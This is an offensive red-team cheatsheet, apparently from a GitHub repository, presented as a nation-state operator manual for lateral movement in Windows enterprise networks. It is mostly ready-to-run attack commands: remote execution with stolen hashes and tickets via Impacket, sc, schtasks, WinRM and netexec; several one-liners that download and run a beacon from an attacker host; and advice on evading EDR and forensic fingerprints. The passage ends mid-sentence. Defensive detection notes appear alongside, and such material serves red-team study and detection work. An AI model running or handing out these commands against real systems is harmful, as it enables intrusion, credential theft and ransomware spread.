# Lateral Movement — Nation-State Operator Field Manual

> **Classification:** Comprehensive lateral movement reference for APT operations. Covers Windows, Linux, macOS, cloud, identity-plane, hypervisor, edge-appliance, and Kubernetes pivots. Every technique includes MITRE ATT&CK mapping, OPSEC rating, detection signatures, and Q1-Q2 2026 viability assessment. Assumes valid credentials or credential material obtained.
>
> **Environment baseline:** Modern enterprise — Windows 10/11 + Server 2019/2022/2025, MDE-class EDR with AMSI/ETW/ASR/Tamper Protection/LSA Protection (audit-mode default Win11 22H2+; full-enforcement requires explicit RunAsPPL=1 or Defender CSP)/Credential Guard, hybrid Entra ID with Conditional Access + PIM + MFA + Identity Protection + Token Protection, **Microsoft Defender for Identity (MDI)** on DCs, **Defender for Cloud Apps (MDCA)** for SaaS visibility, **Defender XDR** cross-product correlation, modern macOS (Ventura/Sonoma/Sequoia 15+), modern Linux with Falco/Tetragon/Tracee, K8s **v1.36+ with fine-grained kubelet authz GA (April 24, 2026)**, VMware vSphere 8.x, **Microsoft Secure Future Initiative defaults** applied (SMB signing required Win11 24H2/Server 2025, LDAP signing required Server 2025 DC default — brownfield upgrades preserve legacy).
>
> **Lateral-movement-specific OPSEC taxonomy:** Each technique rated on:
> - **STEALTH** (LOW / MEDIUM / HIGH / VERY HIGH) — detectability at execution
> - **SUCCESS RATE** (LOW / MED / HIGH) — typical engagement outcome against modern enterprise baseline
> - **SKILL** (LOW / MEDIUM / HIGH / VERY HIGH) — operator expertise required
> - **DETECTION COST** (NEAR-ZERO / LOW / MEDIUM / HIGH) — defender attention cost on activation

---

### Support This Work

If these cheatsheets save you time, consider buying me a coffee.

<a href="https://www.buymeacoffee.com/NoVanity" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50"></a>

**Or scan:**

<img src="https://github.com/MentalVibes/RedTeamCheatSheets/blob/4077a94d94806ba6e6513c29e1410bcda23894d1/qr-code.png" alt="Buy Me A Coffee QR" width="200">

**Crypto:**

| Currency | Address |
|----------|---------|
| **ETH** | `0x3844c08bb832b086d00dbbfec128cb31bdcca838` |

*Accepts ETH, USDC, and any ERC-20 token on Ethereum, Base, Polygon, and other EVM chains.*

---

## 0 — LATERAL MOVEMENT DECISION MATRIX

```
METHOD               │ PORT      │ ARTIFACTS ON TARGET           │ AUTH TYPE           │ OPSEC    │ INTERACTIVE
─────────────────────┼───────────┼───────────────────────────────┼─────────────────────┼──────────┼────────────
WMI (wmiexec)        │ 135+dyn   │ No binary, temp file for I/O  │ Password/Hash/Kerb  │ MEDIUM   │ Semi
DCOM (dcomexec)      │ 135+dyn   │ No binary, varies by object   │ Password/Hash/Kerb  │ VARIES*  │ Semi
WinRM (evil-winrm)   │ 5985/5986 │ No binary, PS logging         │ Password/Hash/Kerb  │ MED-HIGH │ Full
PsExec (impacket)    │ 445       │ Binary + service created      │ Password/Hash/Kerb  │ LOW      │ Full
SMBExec              │ 445       │ Service created (no binary)   │ Password/Hash/Kerb  │ MED-LOW  │ Semi
AtExec               │ 445       │ Scheduled task + temp file    │ Password/Hash/Kerb  │ MEDIUM   │ No
SCM (sc remote)      │ 445       │ Service created               │ Password/Hash       │ LOW      │ No
Schtasks remote      │ 445       │ Scheduled task                │ Password/Hash/Kerb  │ MEDIUM   │ No
RDP                  │ 3389      │ Full GUI session, event logs  │ Password/Hash*      │ LOW      │ Full
SSH                  │ 22        │ Auth log entry                │ Password/Key        │ MEDIUM   │ Full
PowerShell Remoting  │ 5985/5986 │ PS transcription/logging      │ Password/Kerb       │ MED-HIGH │ Full

* RDP with hash requires Restricted Admin Mode enabled on target
* DCOM OPSEC varies by OS: high stealth on older builds, broken/flagged on Win11 24H2+/Server 2025
NOTE: All netexec/Impacket tools support password, NTLM hash (-hashes :HASH),
  Kerberos ticket (-k -no-pass with KRB5CCNAME), and AES key (-aesKey) authentication

TYPICAL LATERAL MOVEMENT CHAINS (how operators actually sequence movement):

  CLASSIC AD TIER CLIMB:
  Foothold on workstation → LSASS dump (with EDR-aware path: see Privesc
  Section 4.5) → cached creds / TGT / NTLM hash → enumerate ACLs and
  delegations via BloodHound → identify Tier 1 server with admin path →
  Overpass-the-Hash (NOT raw PtH) using AES256 key → wmiexec or WinRM to
  Tier 1 → repeat dump → continue climb. Avoid PsExec entirely after the
  first hop — service+binary trail is the heaviest forensic signature.

  ADCS-ENABLED FAST PATH:
  Foothold as low-priv user → certipy find -vulnerable → discover ESC1/
  ESC4/ESC8/ESC13/ESC15 → request cert as DA → certipy auth → NT hash +
  TGT → impacket-secretsdump --just-dc → krbtgt → optional Golden Ticket
  for persistence. Often skips lateral hops entirely — DA in 30 minutes
  from Domain Users membership.

  COERCION + RELAY (NTLM RELAY CHAIN):
  Initial low-priv access → PetitPotam / DFSCoerce / PrinterBug →
  ntlmrelayx targeting LDAPS or AD CS HTTP endpoint → if LDAPS without
  channel binding: --escalate-user OR --shadow-credentials → if AD CS:
  --adcs --template DomainController → DC auth cert → DCSync → krbtgt.
  Heavily mitigated by SMB signing default-on (Win11 24H2/Server 2025)
  but still works against legacy domain workstations and many third-
  party SMB servers.

  COMPROMISED-MSP / SUPPLY-CHAIN PIVOT:
  Access to MSP RMM tooling (ConnectWise, ScreenConnect, Datto RMM,
  Kaseya, N-able) → push commands to all managed endpoints → fan-out
  lateral movement at customer-base scale. The Scattered Spider 2024-
  2025 campaigns repeatedly used this pattern; see Initial Access
  cheatsheet Section 8.3.

  HYBRID IDENTITY → CLOUD CONTROL PLANE:
  On-prem foothold → extract refresh tokens or PRT cookies from local
  WAM (Web Account Manager) cache and Chrome stored cookies → import
  into attacker browser → access O365/Salesforce/Atlassian/etc. as the
  user → enumerate Entra app permissions → pivot to higher-privileged
  service principals (see Persistence Section 14 for the persistence-
  layer extension).

  CI/CD CONTROL-NODE PIVOT:
  Compromise of CI/CD or configuration-management control node
  (Jenkins, GitLab Runner, Ansible Tower / AWX, Salt Master, Puppet
  Master, SCCM Site Server) → mass execution / config push → simultaneous
  foothold on every managed node. Canonical recent examples: LinkPro /
  Synacktiv Oct 2025 (Jenkins → Docker → AWS/K8s); broader Jenkins
  CVE-2024-23897 pattern. Defenders often classify CI/CD as application
  infrastructure rather than identity, leaving the lateral fan-out
  under-monitored.

  RMM-AS-LATERAL (Scattered Spider / UNC3944 dominant pattern):
  Compromised user account → identify deployed RMM tool (ScreenConnect,
  ConnectWise Control, Atera, Datto RMM, NinjaRMM, AnyDesk, TeamViewer)
  → log into RMM admin portal → push commands to ALL managed endpoints
  simultaneously. The MSP variant of this is in Initial Access Section
  8.3; the in-org variant where defenders deploy RMM for legitimate
  remote support is the lateral movement primitive. Canonical 2024-
  2025 incidents (MGM, Marks & Spencer, Co-op, etc.) all leveraged
  this pattern.

  ESXi RANSOMWARE LATERAL (Akira / Black Basta / Hunters / Inc Ransom
  dominant pattern, 2024-2025):
  Initial AD foothold → enumerate vCenter via SPN scan / vSphere SSO
  endpoint discovery → compromise vCenter SSO admin (often AD-integrated)
  OR exploit vCenter CVE chain (CVE-2023-34048 vCenter DCERPC; CVE-2024-
  37079 / -37080 / -37081 vCenter DCERPC June 2024) → propagate to all
  managed ESXi hosts via vSphere API → enable ESXi shell → encrypt all
  guest VMs in single fan-out operation. ESXi-native ransomware variants
  (ESXiArgs, Akira_Linux, Black Basta ESXi build) target the .vmdk and
  .vmx files directly. See Section 16. The dwell-to-impact compression
  here is brutal — many incidents go from foothold to all-VMs-encrypted
  in under 24 hours.

  VEEAM/BACKUP-INFRASTRUCTURE PIVOT (Akira/Black Basta SOP 2024-2025):
  AD foothold → enumerate Veeam Backup & Replication server (often
  domain-joined, often with stored credentials for EVERY backup target —
  DA, ESXi root, NetApp/Dell/HPE storage admin) → exploit CVE-2024-40711
  (Veeam B&R RCE), CVE-2025-23120 (Veeam B&R deserialization Mar 2025),
  OR live-credential-extract from Veeam SQL config DB → unwrap stored
  credentials → instant lateral to ESXi root, DA, and storage admin.
  Veeam is the credential-vault pivot for the entire enterprise. See
  Section 11.6.

  EDGE APPLIANCE PIVOT (Volt Typhoon / Salt Typhoon / multiple APT
  campaigns 2024-2025):
  Compromise Internet-facing edge appliance via known CVE (Ivanti CS
  CVE-2024-21887 chain; PAN-OS CVE-2024-3400 GlobalProtect; NetScaler
  CVE-2023-4966 cookie theft + CVE-2024-8534; Cisco ASA CVE-2024-
  20481) → harvest in-memory creds + management plane keys → pivot
  inward through the appliance into the enterprise network → operator
  is now sitting on a Tier 0-adjacent box that bypasses perimeter
  defenses entirely. See Section 17.

  WSUS-AS-LATERAL (renewed 2024-2025 vector, CVE-2025-59287 boost):
  Compromise WSUS admin → push malicious "approved update" to all
  WSUS-managed clients in scope → domain-wide RCE in single operation.
  Historically WSUSpect/WSUSpendu (Romain Coltel + Yves Le Provost,
  BlackHat 2015) — re-energized by CVE-2025-59287 (October 2025 WSUS
  RCE) and renewed APT use. See Section 2.12.

OPERATOR DECISION TREE (which method should I use?):

  Q: Do I have AES key for the target user?
     YES → Use Overpass-the-Hash with /aes256 flag → Kerberos (quietest)
     NO  → continue ↓
  Q: Do I have NT hash only?
     YES + AES-only forest? → Convert via getTGT first, THEN Kerberos
     YES + legacy forest? → Pass-the-Hash directly (still noisy)
     NO  → continue ↓
  Q: Do I have a Kerberos ticket (TGT/TGS)?
     YES → Pass-the-Ticket (-k -no-pass)
     NO  → continue ↓
  Q: Do I have a certificate (PFX)?
     YES → certipy auth → get hash + TGT, then any of the above
     NO  → I have plaintext password? Use any tool directly.

  Q: What's the target's likely defensive posture?
     Mature SOC + Win11 24H2/Server 2025 → WinRM > WMI > AtExec
        (avoid: PsExec, SMBExec, DCOM, RDP, raw nxc spray)
     Standard enterprise → WMI / WinRM / AtExec preferred
     Legacy / unmanaged → DCOM still works, all options viable
     ICS/OT segment → minimize tool count, single-protocol pivots only

  Q: Do I need SYSTEM context on target?
     YES → AtExec (cleaner than PsExec) or SCM remote
     NO  → WMI / WinRM / DCOM (less privilege required, less noise)

  Q: Do I need interactive shell?
     YES → WinRM / Evil-WinRM (PowerShell logging captures commands)
     SEMI → WMI / DCOM (single command return)
     NO  → AtExec / SCM (fire-and-forget)
```

---

## 1 — CREDENTIAL MATERIAL REFERENCE

```
MATERIAL TYPE        │ OBTAINED FROM                    │ USED WITH
─────────────────────┼──────────────────────────────────┼──────────────────────────────
NTLM Hash            │ LSASS dump, SAM, NTDS.dit, relay │ Impacket (-hashes), nxc, evil-winrm, Mimikatz PTH
AES256 Key           │ sekurlsa::ekeys, DCSync          │ Impacket (-aesKey), Rubeus (asktgt /aes256:)
Kerberos TGT/TGS     │ sekurlsa::tickets, Rubeus dump   │ Any tool via KRB5CCNAME export (-k -no-pass)
Plaintext Password   │ DPAPI vault, config files, Unattend.xml,
                     │   autologon registry, scheduled task creds,
                     │   IIS app config, .git config         │ Everything
                     │   [WDigest LSA cache disabled by default since
                     │   Win 8.1 / Server 2012 R2 — UseLogonCredential=0;
                     │   re-enabling is a configuration change visible
                     │   in registry audit and detected by MDI]
Certificate (PFX)    │ ADCS, DPAPI, KeyStore            │ certipy auth → hash/ticket, then any tool
SSH Private Key      │ ~/.ssh/, memory, config files    │ ssh -i key user@host
Cloud Token (JWT/STS)│ Metadata endpoint, env vars     │ Cloud CLI tools, REST API (Authorization header)
Refresh Token / PRT  │ WAM cache, TokenBroker, browser  │ ROADtools roadtx, AADInternals, attacker browser
                     │   cookie cache                    │   import — see Section 9.2

OPSEC NOTE ON AUTH METHODS:
  Pass-the-Hash (NTLM): Generates Event ID 4624 logon type 3 with NTLM auth package
    → Detectable if Kerberos is expected / baseline shows Kerberos-only
    → MDI raises "Suspected NTLM authentication tampering" on AES-only forests
  Overpass-the-Hash: Requests real TGT from DC → subsequent auth uses Kerberos
    → Blends with normal Kerberos traffic — PREFERRED for stealth
    → Use /aes256: not /rc4: to avoid RC4 etype downgrade detection
  Pass-the-Ticket: Uses existing Kerberos ticket → no contact with DC after initial TGT
    → Stealthy but ticket has limited lifetime (default 10h TGT, 7d renewable)
  Pass-the-Certificate: Obtains hash or ticket via PKINIT → then standard auth
    → Very stealthy — bypasses password-based controls entirely
    → BUT: PKINIT auth from non-smart-card users is anomalous to mature MDI
  Token Replay (refresh/PRT/cookie): Cross-app SSO without re-auth
    → Not on-prem AD telemetry; lives in cloud sign-in logs
    → Token replay from new IP triggers Identity Protection risk score
```

---

## 2 — WINDOWS: REMOTE EXECUTION METHODS

```bash
# ═══════════════════════════════════════════════════════════
# WMIEXEC — WMI Process Creation (T1047)
# ═══════════════════════════════════════════════════════════
# Semi-interactive shell via WMI — no binary dropped on target:
impacket-wmiexec target.local/admin:password@10.0.0.5
impacket-wmiexec -hashes :NTLM_HASH target.local/admin@10.0.0.5
# Kerberos auth:
export KRB5CCNAME=admin.ccache
impacket-wmiexec -k -no-pass target.local/admin@10.0.0.5
# Single command (non-interactive):
impacket-wmiexec target.local/admin:password@10.0.0.5 "whoami"
#
# PowerShell native WMI:
Invoke-WmiMethod -ComputerName 10.0.0.5 -Credential $cred -Class Win32_Process -Name Create -ArgumentList "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/beacon.ps1')"
# CIM (modern replacement for WMI cmdlets):
$cim = New-CimSession -ComputerName 10.0.0.5 -Credential $cred
Invoke-CimMethod -CimSession $cim -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}
#
# HOW IT WORKS: Creates process via Win32_Process.Create WMI method over DCOM/RPC
# Output retrieval: writes stdout to temp file on target, reads via SMB, then deletes
#
# DETECTION: Event ID 4648 (explicit credentials), Event ID 4624 type 3
#   WMI-Activity/Operational log, wmiprvse.exe spawning child processes
#   Sysmon Event ID 1 (process creation by wmiprvse.exe)
# OPSEC RATING: MEDIUM — no binary on disk, but WMI process creation is monitored

# ═══════════════════════════════════════════════════════════
# DCOMEXEC — DCOM Object Abuse (T1021.003)
# ═══════════════════════════════════════════════════════════
# Uses Distributed COM to execute commands. Historically less commonly
# monitored than WMI/services, but mature 2026 EDRs (MDE, CrowdStrike
# Falcon, SentinelOne) carry specific DCOM lateral movement detection
# rules including MITRE-tracked detection strategy DET0285. Stealth
# remains better than PsExec but not the blind spot it once was:
impacket-dcomexec target.local/admin:password@10.0.0.5
impacket-dcomexec -hashes :NTLM_HASH target.local/admin@10.0.0.5
# Specify DCOM object (default: ShellWindows):
impacket-dcomexec -object MMC20 target.local/admin:password@10.0.0.5
impacket-dcomexec -object ShellBrowserWindow target.local/admin:password@10.0.0.5
#
# IMPORTANT — OS VERSION COMPATIBILITY (as of 2025-2026):
# OS VERSION            │ ShellWindows │ ShellBrowser │ MMC20              │ Recommendation
# ──────────────────────┼──────────────┼──────────────┼────────────────────┼───────────────────
# Win11 24H2+/Srv 2025  │ Broken       │ Broken       │ Defender-flagged   │ Avoid / use WMI+WinRM
# Server 2022           │ Broken       │ Broken       │ Works              │ Test MMC20 first
# Older (2019/2016/10)  │ Works        │ Works        │ Works              │ Still viable
# NOTE: This compatibility may change — always test on target OS before relying on DCOM.
#
# Impacket dcomexec.py natively supports ONLY these three objects:
#   MMC20.Application → ExecuteShellCommand method
#   ShellWindows → Navigate method (launches process)
#   ShellBrowserWindow → similar to ShellWindows
#
# Additional DCOM objects exploitable via MANUAL/CUSTOM abuse (not in Impacket dcomexec):
#   Excel.Application → ExecuteExcel4Macro / Run — HEAVILY RESTRICTED 2026:
#     Excel 4.0 macros are disabled by default in Microsoft 365 Apps as of
#     July 2022; Macro execution via DCOM is signatured by Office Application
#     Guard, ASR rules, and Defender for Office. This object remains exploitable
#     only against environments with explicit Excel 4.0 macro re-enablement
#     (rare in modern enterprises).
#   Outlook.Application → CreateObject("WScript.Shell").Run — EDR-FLAGGED:
#     Outlook DCOM with WScript.Shell child process is high-fidelity detection
#     for major EDRs. Use only against unmanaged or legacy Outlook installs.
#   These require custom scripts or C# tooling — not available via -object flag
#
# DETECTION: DCOM/RPC traffic on port 135 + dynamic ports
#   Process creation by DllHost.exe or mmc.exe or excel.exe (depending on object)
#   Mature EDRs have specific "MMC20.Application ExecuteShellCommand" detection rules
#   MITRE ATT&CK DET0285 (DCOM lateral movement) is documented and widely
#   implemented in detection content
# OPSEC RATING: Variable — high stealth on legacy OS; on Win11 24H2+/Server 2025,
#   DCOM lateral movement is largely broken or Defender-blocked. Effectiveness
#   depends entirely on the target's OS version and detection maturity. Use only
#   after verifying target OS and EDR posture.

# ═══════════════════════════════════════════════════════════
# PSEXEC — Remote Service Creation (T1569.002)
# ═══════════════════════════════════════════════════════════
# Impacket PsExec (uploads binary, creates service, returns SYSTEM shell):
impacket-psexec target.local/admin:password@10.0.0.5
impacket-psexec -hashes :NTLM_HASH target.local/admin@10.0.0.5
# Sysinternals PsExec (from Windows):
PsExec.exe \\10.0.0.5 -u domain\admin -p password -s cmd.exe    # -s = SYSTEM
PsExec.exe \\10.0.0.5 -u domain\admin -p password -c payload.exe # Copy + exec
#
# HOW IT WORKS: Connects to ADMIN$/IPC$ → uploads binary → creates + starts service → cleans up
# Returns SYSTEM shell (not admin — because service runs as SYSTEM)
#
# DETECTION: Event ID 7045 (new service), Sysmon Event ID 11 (file create on ADMIN$)
#   Sysmon Event ID 1 (process creation), Event ID 4697 (service installed)
#   Binary hash detection, named pipe creation (pipe name is semi-random)
#   EDR: Most products detect PsExec by default — high signature coverage
# OPSEC RATING: LOW — noisiest common lateral movement method
#   Creates service, drops binary, generates multiple event log entries

# ═══════════════════════════════════════════════════════════
# SMBEXEC — Service Creation Without Binary (T1569.002)
# ═══════════════════════════════════════════════════════════
# Similar to PsExec but does NOT upload a binary:
impacket-smbexec target.local/admin:password@10.0.0.5
impacket-smbexec -hashes :NTLM_HASH target.local/admin@10.0.0.5
#
# HOW IT WORKS: Creates a service that executes cmd.exe /c <command>
# Output written to temp file via > redirect, read back over SMB
# No executable uploaded — slightly stealthier than PsExec
#
# DETECTION: Event ID 7045 (service creation), service with cmd.exe in binpath
# OPSEC RATING: MED-LOW — still creates a service but no binary on disk

# ═══════════════════════════════════════════════════════════
# ATEXEC — Scheduled Task Execution (T1053.005)
# ═══════════════════════════════════════════════════════════
impacket-atexec target.local/admin:password@10.0.0.5 "whoami"
impacket-atexec -hashes :NTLM_HASH target.local/admin@10.0.0.5 "whoami"
#
# HOW IT WORKS: Creates a scheduled task via MS-TSCH RPC
# Writes command output to temp file, reads via SMB, deletes task
# Runs as SYSTEM (scheduled task context)
#
# DETECTION: Event ID 4698 (task created), Event ID 4699 (task deleted)
#   Task Scheduler operational Event ID 106/200/201
# OPSEC RATING: MEDIUM — task creation is logged, but task is deleted quickly

# ═══════════════════════════════════════════════════════════
# REMOTE SERVICE CREATION VIA SCM (T1569.002)
# ═══════════════════════════════════════════════════════════
# Manual service creation on remote host (no Impacket needed):
sc \\10.0.0.5 create "WinUpdate" binpath= "C:\Windows\Temp\beacon.exe" start= demand
sc \\10.0.0.5 start "WinUpdate"
sc \\10.0.0.5 delete "WinUpdate"
# Or execute a command directly via service binary:
sc \\10.0.0.5 create "WinUpdate" binpath= "cmd.exe /c powershell -ep bypass -c IEX(...)" start= demand
sc \\10.0.0.5 start "WinUpdate"
# NOTE: Service will report failure (cmd.exe isn't a valid service binary)
# but the command still executes
#
# DETECTION: Event ID 7045 + 7036 (service start), remote sc.exe calls
# OPSEC RATING: LOW — same artifacts as PsExec

# ═══════════════════════════════════════════════════════════
# REMOTE SCHEDULED TASK VIA SCHTASKS (T1053.005)
# ═══════════════════════════════════════════════════════════
schtasks /create /s 10.0.0.5 /u domain\admin /p password /tn "WinUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc once /st 00:00 /ru SYSTEM /f
schtasks /run /s 10.0.0.5 /u domain\admin /p password /tn "WinUpdate"
schtasks /delete /s 10.0.0.5 /u domain\admin /p password /tn "WinUpdate" /f
#
# DETECTION: Event ID 4698/4699, Task Scheduler operational 106
# OPSEC RATING: MEDIUM — creates + immediately deletes task

# ═══════════════════════════════════════════════════════════
# WINRM / POWERSHELL REMOTING (T1021.006)
# ═══════════════════════════════════════════════════════════
# Evil-WinRM (from Linux — feature-rich):
evil-winrm -i 10.0.0.5 -u admin -p password
evil-winrm -i 10.0.0.5 -u admin -H NTLM_HASH
# Upload/download in evil-winrm session:
upload /tmp/payload.exe C:\Users\Public\payload.exe
download C:\Users\admin\secrets.txt /tmp/secrets.txt
#
# PowerShell Remoting (from Windows):
$cred = Get-Credential
Enter-PSSession -ComputerName 10.0.0.5 -Credential $cred
# Invoke command on remote host:
Invoke-Command -ComputerName 10.0.0.5 -Credential $cred -ScriptBlock { whoami; hostname }
# On multiple targets simultaneously:
Invoke-Command -ComputerName DC01,WEB01,DB01 -Credential $cred -ScriptBlock { whoami }
# Copy file to remote session:
$session = New-PSSession -ComputerName 10.0.0.5 -Credential $cred
Copy-Item -Path C:\local\payload.exe -Destination C:\Users\Public\payload.exe -ToSession $session
#
# DETECTION: Event ID 4624 type 3 (network logon), WinRM operational logs (Event ID 91/168)
#   PowerShell ScriptBlock logging (Event ID 4104), transcription logs
#   Microsoft-Windows-WinRM/Operational log
# OPSEC RATING: MED-HIGH — WinRM encrypts session data at the message layer
#   even over HTTP (5985), not just HTTPS (5986). Traffic is encrypted after
#   authentication regardless of transport. Looks like legitimate admin activity.
#   BUT: PowerShell logging captures commands if enabled

# ═══════════════════════════════════════════════════════════
# IMPACKET FORENSIC FINGERPRINT
# What every Impacket execution method leaves behind, and why
# operators against mature targets must address it.
# ═══════════════════════════════════════════════════════════
# Default Impacket usage produces distinctive forensic artifacts that
# mature SOCs hunt specifically. CISA reports (AA22-277A — Impacket
# and CovalentStealer DIB intrusion, Oct 2022; AA24-038A — Volt Typhoon
# Impacket lateral movement, Feb 2024) and Sygnia incident write-ups
# document Impacket fingerprint discovery as a primary detection vector
# against multiple APT groups (Velvet Ant, UNC5221 follow-on Ivanti
# activity, FIN8 ransomware affiliates, Volt Typhoon, others).
#
# Listing the commands without surfacing the fingerprints misrepresents
# operational reality. The defaults are loud — but each tool exposes
# flags or modifications that reduce the signal.
#
# ┌─────────────┬──────────────────────────────┬──────────────────────────────┐
# │ TOOL        │ DEFAULT FINGERPRINT          │ MITIGATION OPTIONS           │
# ├─────────────┼──────────────────────────────┼──────────────────────────────┤
# │ psexec.py   │ Service name "BTOBTO" in     │ --service-name <name>        │
# │             │ older versions; randomized   │ --remote-binary-name (older  │
# │             │ 4-char (e.g. "AaBb") in      │   versions; current uses     │
# │             │ current versions             │   --service-name)            │
# │             │ Binary path:                 │ Custom service name +        │
# │             │   \\<host>\ADMIN$\<name>.exe │   binary name needed         │
# │             │ Named pipe: RemCom-style     │                              │
# │             │   \\.\pipe\RemCom_<random>   │                              │
# │             │ Image is the embedded        │                              │
# │             │   RemComSvc binary — known   │                              │
# │             │   hash signature             │                              │
# ├─────────────┼──────────────────────────────┼──────────────────────────────┤
# │ smbexec.py  │ Service name "BTOBTO" or     │ --service-name <name>        │
# │             │   randomized in current      │ Output file path is fixed   │
# │             │ Output file:                 │   in the source — requires   │
# │             │   \\<host>\C$\__output       │   code modification          │
# │             │ binPath: cmd.exe /Q /c       │ Service binPath pattern is   │
# │             │   <cmd> > \\127.0.0.1\       │   the highest-fidelity       │
# │             │   C$\__output                │   detection — recompiled     │
# │             │                              │   variant required for       │
# │             │                              │   genuine evasion            │
# ├─────────────┼──────────────────────────────┼──────────────────────────────┤
# │ wmiexec.py  │ Output file:                 │ --share <share> for output   │
# │             │   \\<host>\ADMIN$\__<UNIX_   │   redirect (default ADMIN$)  │
# │             │   timestamp>.<dword>         │ --output-file <path>         │
# │             │ Spawned process tree:        │ wmiprvse.exe → cmd.exe       │
# │             │   wmiprvse.exe → cmd.exe →   │   parent-child chain is      │
# │             │   <command>                  │   always present and         │
# │             │ Win32_Process.Create call    │   visible in Sysmon Event 1  │
# │             │   visible in WMI-Activity    │                              │
# │             │   /Operational               │                              │
# ├─────────────┼──────────────────────────────┼──────────────────────────────┤
# │ atexec.py   │ Task name: random 8-char     │ Task name pattern is        │
# │             │   string                     │   randomized but length is   │
# │             │ Task command: cmd.exe /C     │   fixed (8 chars) — yara    │
# │             │   <command> > C:\Windows\    │   rules pattern-match this  │
# │             │   Temp\<random>.tmp 2>&1     │ Output path can be set with │
# │             │ Output file pattern:         │   --output-file but the     │
# │             │   C:\Windows\Temp\<8-char>   │   schtasks-create event     │
# │             │   .tmp                       │   itself is high-fidelity   │
# ├─────────────┼──────────────────────────────┼──────────────────────────────┤
# │ dcomexec.py │ Spawned process parent       │ Parent-child anomaly is     │
# │             │   varies by --object:        │   intrinsic — defenders      │
# │             │   MMC20 → mmc.exe spawn      │   alert on mmc.exe or       │
# │             │   ShellWindows → explorer    │   dllhost.exe spawning      │
# │             │   ShellBrowser → dllhost     │   cmd.exe / powershell.exe  │
# │             │ DCOM/RPC traffic on 135 +    │ See Win11 24H2+/Srv 2025    │
# │             │   dynamic ports              │   compatibility table       │
# │             │                              │   above — broken on modern  │
# ├─────────────┼──────────────────────────────┼──────────────────────────────┤
# │ secretsdump│ DCSync via DRSUAPI →         │ Replicating Directory       │
# │  (DCSync)   │   replicates from DC         │   Changes audit (ID 4662)    │
# │             │ Replication GUIDs:           │   in mature environments    │
# │             │   1131f6aa-9c07-11d1-... and │ -just-dc-user reduces       │
# │             │   1131f6ad-9c07-11d1-...     │   noise vs full -just-dc    │
# │             │ Source IP visible in 4662    │ Defender for Identity has   │
# │             │                              │   high-fidelity DCSync      │
# │             │                              │   alert; user/source must   │
# │             │                              │   be in expected list       │
# ├─────────────┼──────────────────────────────┼──────────────────────────────┤
# │ secretsdump│ Creates Volume Shadow Copy   │ -exec-method mmcexec uses   │
# │  (-use-vss) │   on target → reads SAM/     │   DCOM instead of services  │
# │             │   SYSTEM/SECURITY/NTDS from  │   (still detected on        │
# │             │   shadow → deletes shadow    │   modern OS)                │
# │             │ Service "WindowsScheduled"   │ -no-vss avoids shadow but   │
# │             │   created (default exec)     │   requires registry-only    │
# │             │                              │   path (no NTDS access)     │
# └─────────────┴──────────────────────────────┴──────────────────────────────┘
#
# AUTHENTICATION PROTOCOL FINGERPRINT:
# Impacket Pass-the-Hash uses NTLM authentication (RC4 etype). In a
# domain enforcing AES-only Kerberos (KRBTGT account configured for
# AES-only, all DCs/services configured to require AES), an inbound
# RC4 NTLM auth from a workstation that historically used AES Kerberos
# is a high-fidelity anomaly. Microsoft Defender for Identity and
# mature SIEM correlation rules surface this directly.
#
# COUNTERMEASURE: Use Overpass-the-Hash (-aesKey instead of -hashes)
# wherever possible — produces normal-looking AES Kerberos AS-REQ
# (Event 4768) instead of NTLM logon (Event 4624 type 3 with
# AuthenticationPackage:NTLM). See Section 4 below.
#
# OPERATOR-GRADE EVASION OPTIONS (in increasing investment order):
# 1. Always pass --service-name explicitly with a name matching legitimate
#    services for the target environment (review running services on a
#    similar host first; impersonate something like "SccmExec" or
#    "GoogleUpdaterInternalService" — names that blend with installed
#    enterprise software).
# 2. Use -k -no-pass with a Kerberos ticket (Overpass-the-Hash) instead
#    of -hashes wherever the target environment supports it.
# 3. Switch to wmiexec (no service, no binary on disk) over psexec/
#    smbexec when SYSTEM context isn't strictly required.
# 4. Recompile Impacket from source with custom strings — replaces the
#    "BTOBTO" defaults, output filename patterns, and other yara-able
#    constants. Multiple maintained private forks exist in red team
#    operator communities.
# 5. Use BOF-based execution (Cobalt Strike inveigh-bof, Outflank C2
#    BOF collection, similar) running inside an existing C2 beacon
#    process — avoids spawning python.exe/Impacket process tree entirely.
#    This is the contemporary nation-state operator default; raw
#    Impacket invocation is increasingly retired in favor of in-memory
#    BOFs that perform the equivalent protocol operation.
# 6. Build native C# implementations (SharpExec, SharpWMI, SharpRDP)
#    that don't carry Python-process and Impacket-string fingerprints.
#
# DETECTION (defender-side reference):
# - Sysmon Event 7045 with binPath matching cmd.exe redirection patterns
#   (smbexec signature)
# - Sysmon Event 1 with parent wmiprvse.exe and image cmd.exe (wmiexec)
# - Sysmon Event 1 with parent mmc.exe / dllhost.exe spawning shells
#   (dcomexec)
# - SecurityEvent 4698 (scheduled task created) with Random8.tmp output
#   pattern (atexec)
# - File creation events in C:\Windows\Temp matching Impacket output
#   patterns (\__output, <random>.tmp)
# - Network: RemCom-style named pipe creation (Sysmon 17/18)
# - DCSync: Event 4662 with the two replication GUIDs from a non-DC
#   source IP


# ═══════════════════════════════════════════════════════════
# NETEXEC (nxc) — Mass Execution (CrackMapExec successor)
# ═══════════════════════════════════════════════════════════
# NOTE: CrackMapExec (cme) is deprecated. Use netexec (nxc) for active development.
# Execute command across many hosts:
nxc smb 10.0.0.0/24 -u admin -p password -x "whoami"
nxc smb 10.0.0.0/24 -u admin -H NTLM_HASH -x "whoami"
nxc winrm 10.0.0.0/24 -u admin -p password -x "whoami"
# Execute PowerShell:
nxc smb 10.0.0.0/24 -u admin -p password -X 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/beacon.ps1")'
# Check credentials against many hosts (spray):
nxc smb 10.0.0.0/24 -u admin -p password
# Shares/sessions/logged-on users:
nxc smb 10.0.0.0/24 -u admin -p password --shares
nxc smb 10.0.0.0/24 -u admin -p password --sessions
#
# DETECTION: Mass SMB connections from single host, Event ID 4624 type 3 across many hosts
# OPSEC RATING: LOW for mass scanning — extremely visible in network traffic

# ═══════════════════════════════════════════════════════════
# SCCM (Configuration Manager) LATERAL MOVEMENT (T1072)
# ═══════════════════════════════════════════════════════════
# Microsoft Endpoint Configuration Manager (formerly SCCM) is a legitimate
# enterprise software-deployment platform. Compromise of an SCCM site
# server, primary site, or sufficiently privileged SCCM admin role
# enables push-execution to every managed endpoint. Documented APT use
